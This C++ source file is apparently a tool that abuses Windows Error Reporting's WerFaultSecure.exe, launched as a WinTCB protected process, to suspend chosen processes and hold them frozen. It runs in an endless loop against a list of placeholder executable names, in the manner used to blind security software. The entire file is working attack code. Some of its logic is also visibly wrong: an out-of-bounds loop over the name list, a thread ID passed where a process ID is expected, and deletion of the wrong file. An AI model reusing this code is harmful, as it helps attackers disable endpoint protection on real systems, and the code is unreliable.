#pragma once
#include <iostream>
#include "ProcessMisc.h"
#include "PPLHelp.h"
#include <tlhelp32.h>

struct PauseCheckParams {
    DWORD targetPID;
    DWORD werPID;
};
DWORD WINAPI PauseCheck(LPVOID lpParam) 
{
    PauseCheckParams* params = static_cast<PauseCheckParams*>(lpParam);
    DWORD targetPID = params->targetPID;
    DWORD werPID = params->werPID;
    while (!IsProcessSuspendedByPID(targetPID))
    {
        continue;
    }
    //target paused, now pause WerFault to keep target freeze
    std::wcout << L"Target paused. PID: " << targetPID << std::endl;
    if (SuspendProcessByPID(werPID))
    {
        std::wcout << L"WER paused. PID: " << targetPID << std::endl;
    }
    return 0;
}
BOOL FreezeRun(DWORD targetPID, DWORD targetTID, DWORD sleepTime)
{
    // 1. Prepare SECURITY_ATTRIBUTES for inheritable handles
    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = nullptr;

    // 2. Create the output files for the dumps
    std::wstring dumpFileName = L"dump_" + std::to_wstring(targetPID) + L".txt";
    HANDLE hEncDump = CreateFileW(dumpFileName.c_str(), GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hEncDump == INVALID_HANDLE_VALUE)
    {
        std::wcerr << L"Failed to create dump files: " << GetLastError() << std::endl;
        return 0;
    }
    // 3. Create the cancellation event
    HANDLE hCancel = CreateEventW(&sa, TRUE, FALSE, nullptr);
    if (!hCancel)
    {
        std::wcerr << L"Failed to create cancel event: " << GetLastError() << std::endl;
        CloseHandle(hEncDump);
        return 0;
    }
    //
    std::wstring werPath = L"C:\\Windows\\System32\\WerFaultSecure.exe";
    std::wstringstream cmd;
    cmd << werPath
        << L" /h"
        << L" /pid " << targetPID
        << L" /tid " << targetTID
        << L" /encfile " << HandleToDecimal(hEncDump)
        << L" /cancel " << HandleToDecimal(hCancel)
        << L" /type 268310"; // dump full
    std::wstring commandLine = cmd.str();
    PPLProcessCreator creator;
    //0 = WinTCB
    DWORD werPID = creator.CreatePPLProcess(0, commandLine);
    if (werPID == 0)
    {
        std::wcerr << L"Failed to create PPL process." << std::endl;
        CloseHandle(hEncDump);
        CloseHandle(hCancel);
        return 0;
    }

    PauseCheckParams* params = new PauseCheckParams{ targetPID, werPID };
    // Create a thread to check target status
    HANDLE hThread = CreateThread(
        nullptr,               // default security attributes
        0,                     // default stack size
        PauseCheck,            // thread function
        params,                // parameter to thread function
        0,                     // default creation flags
        nullptr                // receive thread identifier
    );
    if (hThread == nullptr) 
    {
        std::wcerr << L"Failed to create thread." << std::endl;
        delete params;
        return 0;
    }
    Sleep(sleepTime);
    //terminate WerFaultSecure, let target auto resume
    if (TerminateProcessByPID(werPID))
    {
        std::wcout << L"Kill WER successfully. PID: " << werPID << std::endl;
    }
    else
    {
        std::wcerr << L"Kill WER failed: " << GetLastError() << std::endl;
    }
    CloseHandle(hThread);
    delete params;
    CloseHandle(hEncDump);
    CloseHandle(hCancel);
    // Delete the useless enc file
    if (DeleteFileW(L"t.txt"))
    {
        std::wcout << L"File deleted successfully." << std::endl;
    }
    else
    {
        std::wcerr << L"Error deleting file: " << GetLastError() << std::endl;
    }
    return 1;
}

int wmain(int argc, wchar_t* argv[])
{
	// initalize
    if (!EnableDebugPrivilege())
    {
        std::wcerr << L"Failed to enable debug privilege.\n";
        return 0;
    }

    const wchar_t* vp[] = {
    L"test_000.exe", L"test_001.exe", L"test_002.exe", L"test_003.exe",
    L"test_004.exe", L"test_005.exe", L"test_006.exe", L"test_007.exe",
    L"test_008.exe", L"test_009.exe", L"test_010.exe", L"test_011.exe",
    L"test_012.exe", L"test_013.exe", L"test_014.exe", L"test_015.exe",
    L"test_016.exe", L"test_017.exe", L"test_018.exe", L"test_019.exe"
    };

    DWORD th32ProcessID = 0, targetPID = 0;
    HANDLE Toolhelp32Snapshot, tmpSnapshot;
    PROCESSENTRY32 pe;
    do {
        Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
        if (Toolhelp32Snapshot != INVALID_HANDLE_VALUE)
        {
            tmpSnapshot = Toolhelp32Snapshot;
            if (Process32First(Toolhelp32Snapshot, &pe))
            {
                do {
                    targetPID = pe.th32ProcessID;
                    for (int i = 0; i < 21; i++) {

                        if (_wcsicmp(pe.szExeFile, vp[i]) == 0) {
                            targetPID = pe.th32ProcessID;
							DWORD targetTid = GetMainThreadId(targetPID);
                            if (targetTid == 0)
                            {
                                std::wcerr << L"Failed to find main thread for PID " << targetPID << L"\n";
                                return 0;
                            }
                            FreezeRun(targetPID, GetMainThreadId(targetTid), 10000);
                        }
                    }
                } while (Process32Next(tmpSnapshot, &pe));
                CloseHandle(tmpSnapshot);
            }
        }
        else {
            std::wcerr << L"\nCreateToolhelp32Snapshot failed: " << GetLastError() << std::endl;
        }


    } while (true);


    return 0;
}

